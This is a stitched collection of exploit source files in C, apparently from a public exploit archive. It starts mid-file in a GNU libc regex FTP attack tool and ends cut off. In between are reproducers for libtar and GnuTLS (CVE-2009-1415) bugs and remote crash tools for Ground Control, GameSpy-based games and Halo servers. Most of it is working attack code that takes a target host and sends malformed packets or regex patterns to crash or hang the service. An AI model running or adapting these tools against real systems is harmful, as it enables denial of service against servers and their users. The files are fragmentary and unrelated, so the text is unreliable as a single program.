	if((sockfd=socket(res0->ai_family,res0->ai_socktype,res0->ai_protocol))<0) goto errorcon;
	if(-1==connect(sockfd,res0->ai_addr,res0->ai_addrlen)) goto errorcon;

	snprintf(buffer,1024,"USER %s\nPASS %s\n",login,pass);
	sendftp(sockfd,buffer);

	bzero(buffer,1024);
	snprintf(buffer,1024,"STAT .\n");
	sendftp(sockfd,buffer);
	
	freeaddrinfo(res0);
	close(sockfd);
}

void exploreip(char *ip, int (*ipnum)[4]){
	char *wsk;
	
	wsk=(char *)strtok(ip,".");
	(*ipnum)[0]=atoi(wsk);
	wsk=(char *)strtok(NULL,".");
	(*ipnum)[1]=atoi(wsk);
	wsk=(char *)strtok(NULL,".");
	(*ipnum)[2]=atoi(wsk);
	wsk=(char *)strtok(NULL,".");
	(*ipnum)[3]=atoi(wsk);
}


int createexpl(host,port,login,pass,lip,pattern)
        char *host,*port,*login,*pass,*lip,*pattern;
{
        char buffer[1024]; // send ftp command buffor
        int ipnum[4];

        int sockfd,n,error,sendstream,binarystream,sendport = (1024 + getpid());

	struct addrinfo hints;
	struct addrinfo *res, *res0;
	struct sockaddr_in remo, loca;

	int len = sizeof(remo);
	
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = PF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        error = getaddrinfo(host,port,&hints,&res0);

        if (error){
                errorcon:
		
		if(sendstream) close(sendstream);
		printf("Can`t connect\n.exit");
                exit(1);
        }

        if((sockfd=socket(res0->ai_family,res0->ai_socktype, res0->ai_protocol))<0)     goto errorcon;
        if(-1==connect(sockfd,res0->ai_addr,res0->ai_addrlen)) goto errorcon;

        readftp(sockfd,1024);
        snprintf(buffer,1024,"USER %s\nPASS %s\n",login,pass);
        sendftp(sockfd,buffer);
        readftp(sockfd,1024);
	readftp(sockfd,1024);

	exploreip(lip,&ipnum);
        snprintf(buffer,1024,"TYPE I\nPORT %d,%d,%d,%d,%d,%d\n",ipnum[0],ipnum[1],ipnum[2],ipnum[3],sendport/256,sendport%256);
        sendftp(sockfd,buffer);
        readftp(sockfd,1024);
	
	bzero(&loca, sizeof(loca));
	loca.sin_family = AF_INET;
	loca.sin_port=htons(sendport);
	loca.sin_addr.s_addr = htonl(INADDR_ANY);

	if((sendstream=socket(AF_INET, SOCK_STREAM,0))<0) goto errorcon;
	if((bind(sendstream, (struct sockaddr *) &loca, sizeof(loca)))<0) goto errorcon;
	if(listen(sendstream, 10) < 0) goto errorcon;

	snprintf(buffer,1024,"STOR .ftpaccess\n");
        sendftp(sockfd,buffer);
	
        readftp(sockfd,1024);

	if((binarystream=accept(sendstream,(struct sockaddr *)&remo,&len)) < 0) goto errorcon;
	write(binarystream,pattern,strlen(pattern));
	
	freeaddrinfo(res0);
	close(sendstream);
	printf("Created .ftpaccess file with %s\nIt`s time to attack...\n",pattern);
	sleep(3);
	
	return 0;
}

void usage(){
	printf("Use: ./exploit target_ip port username password [your_ip] [option]\n\nCreate .ftpaccess with selected attack\noptions:\n1 - Long execution CVE-2010-4052\n2 - Recursion Crash CVE-2010-4051\n3 - Memory exhausion \n4 - Crash if virtual memory limited\n\n");
	exit(1);
}

int main(int argc,char *argv[])
{

        char *login,*pass,*lip=NULL;
        char logindef[]="anonymous",passdef[]="cx@127.0.0.1";

        printf("This is exploit for ERE (GNU libc)\nby Maksymilian Arciemowicz\n\n");

        if(argc<3) usage();

        char *host=argv[1];
        char *port=argv[2];

        if(4<=argc) login=argv[3];
        else login=logindef;

        if(5<=argc) pass=argv[4];
        else pass=passdef;

	if(6<=argc) lip=argv[5];
	
	if(7<=argc) switch(atoi(argv[6])){
		case 1:
			printf("Try create .ftpaccess with %s\n\n",expl0); 
			createexpl(host,port,login,pass,lip,expl0);
		break;
		
		case 2:
			printf("Try create .ftpaccess with %s\n\n",expl1);
			createexpl(host,port,login,pass,lip,expl1);
		break;
		
		case 3:
			printf("Try create .ftpaccess with %s\n\n",expl2);
			createexpl(host,port,login,pass,lip,expl2);
		break;
		
		case 4:
			printf("Try create .ftpaccess with %s\n\n",expl3);
			createexpl(host,port,login,pass,lip,expl3);
		break;
		
		default:
			usage();
		break;
	};

	while(1) attack(host,port,login,pass);
	
        return 0; // never happen
}

source: http://www.securityfocus.com/bid/26445/info

GNU's tar and cpio utilities are prone to a denial-of-service vulnerability because of insecure use of the 'alloca()' function.

Successfully exploiting this issue allows attackers to crash the affected utilities and possibly to execute code, but this has not been confirmed.

GNU tar and cpio utilities share the same vulnerable code and are both affected. Other utilities sharing this code may also be affected.

/*
 * paxlib's safer_name_suffix() stack overflow reproducer.
 */

#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <libtar.h>

int main(int ac, const char *av[])
{
	struct rlimit r;
	unsigned count, i;
	char *s;
	TAR *t;

	if (ac != 2)
		error(1, 0, "exactly two arguments expected");

	if (getrlimit(RLIMIT_STACK, &r))
		error(1, errno, "getrlimit RLIMIT_STACK");

	count = r.rlim_cur / 3 + 1;
	if (!(s = malloc(count * 3 + 1)))
		error(1, errno, "malloc: %u", count * 3 + 1);

	for (i = 0; i < count; ++i)
		memcpy(s + i * 3, "../", 3);
	s[count * 3] = '\0';

	if (tar_open(&t, av[1], NULL, O_WRONLY|O_CREAT, 0644, TAR_GNU))
		error(1, errno, "tar_open: %s", av[1]);

	if (tar_append_file(t, "/dev/null", s))
		error(1, errno, "tar_append_file: %s", av[1]);

	if (tar_close(t))
		error(1, errno, "tar_close");

	return 0;
}
source: http://www.securityfocus.com/bid/34783/info

GnuTLS is prone to multiple remote vulnerabilities:

- A remote code-execution vulnerability
- A denial-of-service vulnerability
- A signature-generation vulnerability
- A signature-verification vulnerability

An attacker can exploit these issues to potentially execute arbitrary code, trigger denial-of-service conditions, carry out attacks against data signed with weak signatures, and cause clients to accept expired or invalid certificates from servers.

Versions prior to GnuTLS 2.6.6 are vulnerable. 

/*
 * Small code to reproduce the CVE-2009-1415 double-free problem.
 *
 * Build it using:
 *
 *  gcc -o cve-2009-1415 cve-2009-1415.c -lgnutls
 *
 * If your gnutls library is OK then running it will just print 'success!'.
 *
 * If your gnutls library is buggy, then running it will crash like this:
 *
 * ** glibc detected *** ./cve-2009-1415: munmap_chunk(): invalid pointer: 0xb7f80a9c ***
 * ======= Backtrace: =========
 * ...
 */

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>

#include <gnutls/gnutls.h>

static char dsa_cert[] =
  "-----BEGIN CERTIFICATE-----\n"
  "MIIDbzCCAtqgAwIBAgIERiYdRTALBgkqhkiG9w0BAQUwGTEXMBUGA1UEAxMOR251\n"
  "VExTIHRlc3QgQ0EwHhcNMDcwNDE4MTMyOTQxWhcNMDgwNDE3MTMyOTQxWjA3MRsw\n"
  "GQYDVQQKExJHbnVUTFMgdGVzdCBzZXJ2ZXIxGDAWBgNVBAMTD3Rlc3QuZ251dGxz\n"
  "Lm9yZzCCAbQwggEpBgcqhkjOOAQBMIIBHAKBgLmE9VqBvhoNxYpzjwybL5u2DkvD\n"
  "dBp/ZK2d8yjFoEe8m1dW8ZfVfjcD6fJM9OOLfzCjXS+7oaI3wuo1jx+xX6aiXwHx\n"
  "IzYr5E8vLd2d1TqmOa96UXzSJY6XdM8exXtLdkOBBx8GFLhuWBLhkOI3b9Ib7GjF\n"
  "WOLmMOBqXixjeOwHAhSfVoxIZC/+jap6bZbbBF0W7wilcQKBgGIGfuRcdgi3Rhpd\n"
  "15fUKiH7HzHJ0vT6Odgn0Zv8J12nCqca/FPBL0PCN8iFfz1Mq12BMvsdXh5UERYg\n"
  "xoBa2YybQ/Dda6D0w/KKnDnSHHsP7/ook4/SoSLr3OCKi60oDs/vCYXpNr2LelDV\n"
  "e/clDWxgEcTvcJDP1hvru47GPjqXA4GEAAKBgA+Kh1fy0cLcrN9Liw+Luin34QPk\n"
  "VfqymAfW/RKxgLz1urRQ1H+gDkPnn8l4EV/l5Awsa2qkNdy9VOVgNpox0YpZbmsc\n"
  "ur0uuut8h+/ayN2h66SD5out+vqOW9c3yDI+lsI+9EPafZECD7e8+O+P90EAXpbf\n"
  "DwiW3Oqy6QaCr9Ivo4GTMIGQMAwGA1UdEwEB/wQCMAAwGgYDVR0RBBMwEYIPdGVz\n"
  "dC5nbnV0bHMub3JnMBMGA1UdJQQMMAoGCCsGAQUFBwMBMA8GA1UdDwEB/wQFAwMH\n"
  "gAAwHQYDVR0OBBYEFL/su87Y6HtwVuzz0SuS1tSZClvzMB8GA1UdIwQYMBaAFOk8\n"
  "HPutkm7mBqRWLKLhwFMnyPKVMAsGCSqGSIb3DQEBBQOBgQBCsrnfD1xzh8/Eih1f\n"
  "x+M0lPoX1Re5L2ElHI6DJpHYOBPwf9glwxnet2+avzgUQDUFwUSxOhodpyeaACXD\n"
  "o0gGVpcH8sOBTQ+aTdM37hGkPxoXjtIkR/LgG5nP2H2JRd5TkW8l13JdM4MJFB4W\n"
  "QcDzQ8REwidsfh9uKAluk1c/KQ==\n"
  "-----END CERTIFICATE-----\n";

const gnutls_datum_t dsa_cert_dat = {
  dsa_cert, sizeof (dsa_cert)
};

int
main (void)
{
  gnutls_x509_crt_t crt;
  gnutls_datum_t data = { "foo", 3 };
  gnutls_datum_t sig = { "bar", 3 };
  int ret;

  gnutls_global_init ();

  ret = gnutls_x509_crt_init (&crt);
  if (ret < 0)
    return 1;

  ret = gnutls_x509_crt_import (crt, &dsa_cert_dat, GNUTLS_X509_FMT_PEM);
  if (ret < 0)
    return 1;

  ret = gnutls_x509_crt_verify_data (crt, 0, &data, &sig);
  if (ret < 0)
    return 1;

  printf ("success!\n");

  gnutls_x509_crt_deinit (crt);
  gnutls_global_deinit ();

  return 0;
}

/*
by Luigi Auriemma
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
 #include <winsock.h>
 #include "winerr.h"

 #define close closesocket
 #define ONESEC 1000
#else
 #include <unistd.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <arpa/inet.h>
 #include <netdb.h>

 #define ONESEC 1
#endif

#define VER "0.1"
#define PORT 42001
#define BUFFSZ 2048
#define BOOMSZ 1024 // 513 is enough
#define TIMEOUT 3
#define INFO "\x58\x00\x00\x00" /* build */ \
       "\x52\x00" /* protocol */ \
       "\x0a\x00\x00" /* gameinfo */
       /* this packet is not important, you can also use random data */

void show_gc2info(u_char *data, int len);
void unicode2char(u_char *data, int len);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);

int main(int argc, char *argv[]) {
 struct sockaddr_in peer;
 int sd,
     len,
     psz,
     on = 1,
     type,
     doubt = 0;
 u_short port = PORT;
 u_char buff[BUFFSZ];

 setbuf(stdout, NULL);

 fputs("\n"
   "Ground Control <= 1.0.0.7 server/client crash "VER"\n"
   "by Luigi Auriemma\n"
   "e-mail: aluigi@altervista.org\n"
   "web: http://aluigi.altervista.org\n"
   "\n", stdout);

 if(argc < 2) {
   printf("\nUsage: %s <attack> [port(%d)]\n"
     "\n"
     "Attack:\n"
     " c = broadcast clients crash\n"
     " s = server crash (can be also directly used versus a client)\n"
     " You must add the IP or the hostname of the server after the 
's'.\n"
     "\n"
     "Some usage examples:\n"
     " gc2boom c listens on port %d for clients\n"
     " gc2boom c 1234 listens on port 1234\n"
     " gc2boom s 192.168.0.1 tests the server 192.168.0.1 on port %d\n"
     " gc2boom s codserver 1234 tests the server codserver on port 
1234\n"
     "\n", argv[0], PORT, PORT, PORT);
   exit(1);
 }

#ifdef WIN32
 WSADATA wsadata;
 WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

 type = argv[1][0];
 if(type == 's') {
   if(!argv[2]) {
     fputs("\n"
       "Error: you must specify the server IP or hostname.\n"
       " Example: gc2boom s localhost\n"
       "\n", stdout);
     exit(1);
   }
   peer.sin_addr.s_addr = resolv(argv[2]);
   if(argc > 3) port = atoi(argv[3]);
   printf("\n- Target %s:%hu\n\n",
     inet_ntoa(peer.sin_addr),
     port);
 } else if(type == 'c') {
   peer.sin_addr.s_addr = INADDR_ANY;
   if(argc > 2) port = atoi(argv[2]);
   printf("\n- Listening on port %d\n", port);
 } else {
   fputs("\n"
     "Error: Wrong type of attack.\n"
     " You can choose between 2 types of attacks, versus clients with 'c' 
or\n"
     " versus servers with 's'\n"
     "\n", stdout);
   exit(1);
 }

 peer.sin_port = htons(port);
 peer.sin_family = AF_INET;
 psz = sizeof(peer);

 sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 if(sd < 0) std_err();

 if(type == 's') {
   fputs("- Request informations\n", stdout);
   if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, 
sizeof(peer))
    < 0) std_err();
   if(timeout(sd) < 0) {
     fputs("\n"
       "Alert: socket timeout, probably the server is not online or the 
port you have\n"
       " choosen is not exact.\n"
       " Check the \"unreliableport\" value in the server's 
informations.\n"
       " This tool now continue the attack\n", stdout);
       doubt = 1;
   } else {
     len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
     if(len < 0) std_err();
     show_gc2info(buff, len);
   }

   memset(buff, 0x00, BOOMSZ);
   fputs("- Send BOOM packet\n", stdout);
   if(sendto(sd, buff, BOOMSZ, 0, (struct sockaddr *)&peer, sizeof(peer))
    < 0) std_err();

   fputs("- Wait one second for an exact check\n", stdout);
   sleep(ONESEC);

   fputs("- Check if server is vulnerable\n", stdout);
   if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, 
sizeof(peer))
    < 0) std_err();
   if(doubt) {
     fputs("\nI can't say if the host is vulnerable, check it 
manually\n\n", stdout);
   } else {
     if(timeout(sd) < 0) {
       fputs("\nServer IS vulnerable!!!\n\n", stdout);
     } else {
       fputs("\nServer doesn't seem vulnerable\n\n", stdout);
     }
   }
 } else {
   if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
    < 0) std_err();
   if(bind(sd, (struct sockaddr *)&peer, sizeof(peer))
    < 0) std_err();
   fputs("Clients:\n", stdout);
   while(1) {
     len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);
     if(len < 0) std_err();
     buff[len] = 0x00;

     printf("%16s:%hu -> %s\n",
       inet_ntoa(peer.sin_addr),
       ntohs(peer.sin_port),
       buff);

     memset(buff, 0x00, BOOMSZ);
     if(sendto(sd, buff, BOOMSZ, 0, (struct sockaddr *)&peer, 
sizeof(peer))
      < 0) std_err();
   }
 }

 close(sd);
 return(0);
}

void show_gc2info(u_char *data, int len) {
 u_char *ptr;
 int cp;

 printf("\n Build: %d", *(u_short *)data);
 printf("\n Protocol: %d", *(u_short *)(data + 4));
 printf("\n Gameinfo: %d", *(u_short *)(data + 6));
 ptr = data + 9;
 fputs("\n Server name: ", stdout);
 unicode2char(ptr + 1, *ptr);
 fwrite(ptr + 1, 1, *ptr, stdout);
 ptr += (*ptr << 1) + 1;
 fputs("\n Map: ", stdout);
 ptr += fwrite(ptr + 1, 1, *ptr, stdout) + 1;
 fputs("\n External IP: ", stdout);
 ptr += fwrite(ptr + 1, 1, *ptr, stdout) + 1;
 ptr += 4;
 cp = *ptr++;
 printf("\n Current players: %d", cp);
 printf("\n Max players: %d", *ptr++);
 printf("\n ???: %s", *ptr++ ? "true" : "false");
 printf("\n Dedicated: %s", *ptr++ ? "true" : "false");
 printf("\n Password: %s", *ptr++ ? "true" : "false");
 ptr += 5;
 while(cp--) {
   fputs("\n Player: ", stdout);
   unicode2char(ptr + 1, *ptr);
   fwrite(ptr + 1, 1, *ptr, stdout);
   ptr += (*ptr << 1) + 1 + 6;
 }
 fputs("\n\n", stdout);
}

void unicode2char(u_char *data, int len) {
 u_char *out = data;

 while(len--) {
   *out++ = *data++;
   data++;
 }
}

int timeout(int sock) {
 struct timeval tout;
 fd_set fd_read;
 int err;

 tout.tv_sec = TIMEOUT;
 tout.tv_usec = 0;
 FD_ZERO(&fd_read);
 FD_SET(sock, &fd_read);
 err = select(sock + 1, &fd_read, NULL, NULL, &tout);
 if(err < 0) std_err();
 if(!err) return(-1);
 return(0);
}

u_long resolv(char *host) {
 struct hostent *hp;
 u_long host_ip;

 host_ip = inet_addr(host);
 if(host_ip == INADDR_NONE) {
   hp = gethostbyname(host);
   if(!hp) {
     printf("\nError: Unable to resolve hostname (%s)\n", host);
     exit(1);
   } else host_ip = *(u_long *)(hp->h_addr);
 }
 return(host_ip);
}

#ifndef WIN32
 void std_err(void) {
   perror("\nError");
   exit(1);
 }
#endif

// milw0rm.com [2004-08-31]
/*

by Luigi Auriemma

UNIX & WIN VERSION
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif





#define VER     "0.1"
#define BUFFSZ  2048
#define TIMEOUT 5





void gamespyxor(u_char *string, int len);
void gs_info_udp(u_long ip, u_short port);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);






int main(int argc, char *argv[]) {
    int         sd,
                err;
    u_short     port;
    u_char      pck[] = "\\crash\0";
                /* the bug is caused by the absence of  */
                /* the final backslash (as \crash\)     */
                /* the final NULL is useless but I want */
                /* to be sure at 100%                   */
    struct  sockaddr_in peer;


    setbuf(stdout, NULL);

    fputs("\n"
        "Gamespy hidden cd-key SDK: remote server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Vulnerable games                 Latest bugged versions  Default query ports\n"
            "----------------------------------------------------------------------------\n"
            "  Battlefield 1942               1.6.19, 1.6rc1          23000, 22000 (LAN)\n"
            "  Contract Jack                  1.1                     27888\n"
            "  Gore                           1.48 (1.49)             27778\n"
            "  Halo                           1.031                   2302\n"
            "  Hidden & Dangerous 2           1.04                    11004\n"
            "  IGI 2: Covert Strike           1.3                     26001\n"
            "  Judge Dredd: Dredd vs. Death   1.01                    25858\n"
            "  Need For Speed Hot Pursuit 2   242                     61220\n"
            "  TRON2.0                        1.042                   27888\n"
            "  ...possibly others...\n"
            "\n"
            "Usage: %s <server> <port>\n"
            "\n", argv[0]);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    port                 = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("\nContacting %s:%hu\n",
        inet_ntoa(peer.sin_addr), port);

    gs_info_udp(peer.sin_addr.s_addr, port);

        /* boom */
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    gamespyxor(pck, sizeof(pck) - 1);
    err = sendto(sd, pck, sizeof(pck) - 1, 0, (struct sockaddr *)&peer, sizeof(peer));
    if(err < 0) std_err();
    close(sd);

    fputs("\nMalicious packet has been sent, Now I check if the server is crashed:\n", stdout);

        /* check */
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    err = sendto(sd, "\\status\\", 8, 0, (struct sockaddr *)&peer, sizeof(peer));
    if(err < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem to be vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}






void gamespyxor(u_char *string, int len) {
    u_char  gamespy[] = "gamespy",
            *gs;
    for(gs = gamespy; len; len--, gs++, string++) {
        if(!*gs) gs = gamespy;
        *string ^= *gs;
    }
}






void gs_info_udp(u_long ip, u_short port) {
    struct  sockaddr_in peer;
    int     sd,
            err,
            plen,
            nt = 1;
    u_char  buff[2048],
            *p1,
            *p2;

    peer.sin_addr.s_addr = ip;
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;
    plen                 = sizeof(peer);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    err = sendto(sd, "\\status\\", 8, 0, (struct sockaddr *)&peer, plen);
    if(err < 0) std_err();

    if(timeout(sd) < 0) {
        fputs("\nError: socket timeout, I exit\n", stdout);
        exit(1);
    }

    err = recvfrom(sd, buff, sizeof(buff) - 1, 0, (struct sockaddr *)&peer, &plen);
    if(err < 0) std_err();

    buff[err] = 0x00;
    p1 = buff;
    while(1) {
        p2 = strchr(p1, '\\');
        if(!p2) break;
        *p2 = 0x00;

        if(!nt) {
            printf("%30s: ", p1);
            nt++;
        } else {
            printf("%s\n", p1);
            nt = 0;
        }
        p1 = p2 + 1;
    }
    printf("%s\n\n", p1);
    close(sd);
}






int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}





u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}





#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif



/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "gssdkcr.h"
#include "halo_pck_algo.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define BUFFSZ      8192
#define PORT        2302
#define TIMEOUT     1
#define BOOMSZ      16      // minimum is 4

#define ADDMEM(x,y) memcpy(p, x, y); \
                    p += y;
#define ADDINT(x)   *(u_int *)p = x; \
                    p += 4;
#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err();
#define RECV(x,y)   len = recvfrom(sd, x, y, 0, NULL, NULL); \
                    if(len < 0) std_err();
#define SOCKTOUT    if(len < 0) { \
                        fputs("\nError: socket timeout, no reply received\n\n", stdout); \
                        exit(1); \
                    }



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz);
int show_info(u_char *data, int len);
int timeout(int sock);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    int     sd,
            len,
            ver;
    u_short port = PORT;
    u_char  buff[BUFFSZ + 1],
            info[] =
                "\xfe\xfd" "\x00" "\x00\x00\x00\x00" "\xff\x00\x00",
            enckey[16],
            deckey[16],
            *psdk,
            *p;

#pragma pack(1) // a basic header
    struct gssdk_header {
        u_short sign;
        u_char  type;
        u_short gs1;
        u_short gs2;
    } *gh;
#pragma pack()

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "Halo <= 1.06 endless loop "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr  = resolv(argv[1]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- request informations:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    *(u_int *)(info + 3) = ~time(NULL);
    len = send_recv(sd, info, sizeof(info) - 1, buff, BUFFSZ);
    close(sd);
    SOCKTOUT;

    buff[len] = 0x00;
    ver = show_info(buff, len);
    if(ver <= 0) {
        fputs("\nError: the server version has not been found, it is needed to join\n\n", stdout);
        exit(1);
    }
    printf("\n- use version:   %d\n", ver);

    gh = (struct gssdk_header *)buff;
    psdk = buff + 7;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    gh->sign = htons(0xfefe);
    gh->type = 1;
    gh->gs1  = htons(0);
    gh->gs2  = htons(0);
    memset(psdk, '0', 32);
    gssdkcr(psdk, psdk, 0);

    len = send_recv(sd, buff, 39, buff, BUFFSZ);
    SOCKTOUT;

    if((gh->type != 2) || (ntohs(gh->gs1) != 0) || (ntohs(gh->gs2) != 1)) {
        fputs("\n  the first packet doesn't seem to have been accepted, I continue\n", stdout);
    }

    gh->sign = htons(0xfefe);
    gh->type = 3;
    gh->gs1  = htons(1);
    gh->gs2  = htons(1);
    gssdkcr(psdk, buff + 39, 0);
    p = psdk + 32;

    halo_generate_keys(NULL, enckey);

    ADDMEM(enckey, 16);
    ADDINT(ver);

    len = send_recv(sd, buff, p - buff, buff, BUFFSZ);
    SOCKTOUT;

    for(;;) {
        if((gh->type == 4) && (ntohs(gh->gs1) == 1) && (ntohs(gh->gs2) == 2)) {
            halo_generate_keys(psdk, deckey);
            halo_generate_keys(psdk, enckey);
        }

        if(!gh->type) {
            fputs("- connection accepted\n", stdout);
            halo_tea_decrypt(buff + 7, len - 7, deckey);

            gh->sign = htons(0xfefe);
            gh->type = 0;
            gh->gs1  = htons(2);
            gh->gs2  = htons(3);

            memset(psdk, 0xff, BOOMSZ); // malformed data
            len = BOOMSZ;

            *(u_int *)(psdk + len) = halo_crc32(psdk, len);
            len += 4;

            halo_tea_encrypt(psdk, len, enckey);
            len += 7;

            fputs("- send malformed data\n", stdout);
            len = send_recv(sd, buff, len, buff, BUFFSZ);
            if(len < 0) break;
        }

        if((gh->type == 5) && (ntohs(gh->gs1) == 1) && (ntohs(gh->gs2) == 2)) {
            fputs("\n"
                "Error: server is full or has not accepted the connection so cannot be tested.\n"
                "       Retry later\n"
                "\n", stdout);
            exit(1);
        }

        if(timeout(sd) < 0) break;
        RECV(buff, BUFFSZ);
    }

    close(sd);

    fputs("- check server:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    len = send_recv(sd, info, sizeof(info) - 1, buff, BUFFSZ);
    close(sd);
    if(len < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    return(0);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz) {
    int     i,
            len;

    for(i = 3; i; i--) {        
        SEND(in, insz);
        if(!timeout(sd)) break;
    }
    if(!i) return(-1);

    RECV(out, outsz);
    return(len);
}



int show_info(u_char *data, int len) {
    u_char  *v,
            *limit = data + len;
    int     nt = 0,
            d,
            ver = -1;

    data += 5;
    while(data < limit) {
        d = strlen(data);
        if(nt & 1) {
            if(!ver) {
                v = strrchr(data, '.');
                if(v) ver = atoi(v + 1) * 1000;
            }
            printf("%s\n", data);
        } else {
            if(!d) break;
            if(!strcmp(data, "gamever")) ver = 0;
            printf("%30s: ", data);
        }
        data += d + 1;
        nt++;
    }
    return(ver);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct hostent *hp;
    u_int host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
    Copyright 2008 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "gssdkcr.h"
#include "halo_pck_algo.h"
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        2302
#define BUFFSZ      8192



u32 halo_info(u8 *buff, struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
